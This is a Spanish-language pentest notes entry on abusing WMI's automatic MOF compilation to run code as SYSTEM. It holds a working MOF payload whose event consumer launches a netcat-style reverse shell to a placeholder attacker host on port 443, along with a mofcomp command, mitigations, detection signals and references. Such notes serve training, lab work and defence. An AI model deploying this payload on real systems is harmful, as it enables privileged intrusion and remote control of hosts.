---
topic: WMI — ejecución con MOF de auto-instalación
tags: [windows, wmi, mof, privesc, lateral-movement]
---

# WMI — ejecución con MOF de auto-instalación

[🇬🇧 English](mof-wmi-self-install.en.md) | **Español**

## Concepto

WMI compila automáticamente los archivos `.mof` colocados en `C:\Windows\System32\wbem\mof\`. Un MOF puede registrar un `ActiveScriptEventConsumer` y un filtro de eventos; cuando el evento se dispara, el consumidor ejecuta código con los privilegios del servicio WMI, normalmente SYSTEM.

## Cuándo aplica

- Se puede escribir en el directorio `wbem\mof` o en una ruta compilada por `mofcomp`.
- TFTP, SMB u otro servicio permite subir archivos como SYSTEM.
- El host ejecuta WMI y no monitoriza consumidores nuevos.

## Procedimiento

1. Subir un ejecutable de reverse shell a una ruta accesible.
2. Crear un MOF con un consumidor y un filtro.
3. Colocarlo en `wbem\mof` o compilarlo con `mofcomp`.
4. Disparar el evento o esperar la compilación automática.

```text
#pragma namespace("\\\\.\\root\\cimv2")
instance of ActiveScriptEventConsumer as $cons {
  Name = "ASEC";
  ScriptingEngine = "JScript";
  ScriptText = "new ActiveXObject('Wscript.Shell').Run('C:\\\\Windows\\\\Temp\\\\n.exe -e cmd.exe <ATTACKER> 443');";
};
instance of __EventFilter as $filt {
  Name = "instfilt";
  Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = 'MyClass'";
};
instance of __FilterToConsumerBinding as $bind { Consumer = $cons; Filter = $filt; };
```

```cmd
mofcomp C:\Windows\Temp\payload.mof
```

## Variantes

- `CommandLineEventConsumer` en lugar de `ActiveScriptEventConsumer`.
- Filtro temporal con `__TimerEvent` para ejecución diferida.
- MOF colocado por SMB en un share con permisos de escritura.

## Limitaciones

- Requiere permiso de escritura en una ruta compilada.
- El repositorio WMI puede estar dañado o monitorizado.
- Un EDR puede bloquear la creación de consumidores.

## Mitigación

- Restringir la escritura en `System32` y `wbem\mof`.
- Monitorizar la creación de filtros y consumidores WMI.
- Deshabilitar servicios de transferencia anónimos.

## Detección

- Archivos `.mof` nuevos en `wbem\mof`.
- Eventos 5861 de WMI y procesos hijos de `WmiPrvSE.exe`.
- `ActiveScriptEventConsumer` con scripts en línea.

## Referencias

- [Microsoft — MOF files and mofcomp](https://learn.microsoft.com/en-us/windows/win32/wmisdk/mof-files)
- [0xdf — Dropzone](https://0xdf.gitlab.io/2018/11/03/htb-dropzone.html)
- [MITRE ATT&CK — T1047 WMI](https://attack.mitre.org/techniques/T1047/)
